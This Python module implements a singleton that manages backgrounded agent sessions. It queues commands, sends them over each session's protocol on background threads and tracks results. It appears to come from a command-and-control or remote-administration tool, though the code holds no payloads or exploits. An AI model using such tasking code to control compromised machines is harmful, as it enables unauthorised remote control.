import threading
import time
from dataclasses import dataclass, field
from typing import Optional, Any


@dataclass
class TaskResult:
    task_id: int
    agent_id: str
    command: str
    result: str
    status: str = 'pending'
    created_at: float = field(default_factory=time.time)
    completed_at: Optional[float] = None


class BackgroundManager:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    obj = super().__new__(cls)
                    obj._contexts: dict[str, Any] = {}
                    obj._tasks: dict[str, dict[int, TaskResult]] = {}
                    obj._counter = 0
                    obj._task_lock = threading.Lock()
                    cls._instance = obj
        return cls._instance

    def background(self, ctx, agent_id: str):
        self._contexts[agent_id] = ctx
        if agent_id not in self._tasks:
            self._tasks[agent_id] = {}

    def is_backgrounded(self, agent_id: str) -> bool:
        return agent_id in self._contexts

    def unbackground(self, agent_id: str):
        self._contexts.pop(agent_id, None)

    def queue(self, agent_id: str, command: str) -> int:
        ctx = self._contexts.get(agent_id)
        if not ctx:
            return -1

        with self._task_lock:
            self._counter += 1
            task_id = self._counter
            task = TaskResult(
                task_id=task_id,
                agent_id=agent_id,
                command=command,
            )
            self._tasks[agent_id][task_id] = task

        t = threading.Thread(
            target=self._execute,
            args=(ctx, agent_id, task_id, command),
            daemon=True,
        )
        t.start()
        return task_id

    def _execute(self, ctx, agent_id, task_id, command):
        try:
            ctx.protocol.send(command)
            result = str(ctx.protocol.recv())
            with self._task_lock:
                task = self._tasks[agent_id].get(task_id)
                if task:
                    task.result = result
                    task.status = 'completed'
                    task.completed_at = time.time()
        except Exception as e:
            with self._task_lock:
                task = self._tasks[agent_id].get(task_id)
                if task:
                    task.result = f'[-] Error: {str(e)}'
                    task.status = 'failed'
                    task.completed_at = time.time()

    def get_tasks(self, agent_id: str) -> list[TaskResult]:
        tasks = self._tasks.get(agent_id, {})
        return sorted(tasks.values(), key=lambda t: t.created_at, reverse=True)[:50]

    def get_result(self, agent_id: str, task_id: int) -> Optional[str]:
        tasks = self._tasks.get(agent_id, {})
        task = tasks.get(task_id)
        return task.result if task else None

    def get_pending_count(self, agent_id: str) -> int:
        tasks = self._tasks.get(agent_id, {})
        return sum(1 for t in tasks.values() if t.status == 'pending')

    def list_backgrounded(self) -> list[str]:
        return list(self._contexts.keys())

    def get_context(self, agent_id: str) -> Optional[Any]:
        return self._contexts.get(agent_id)
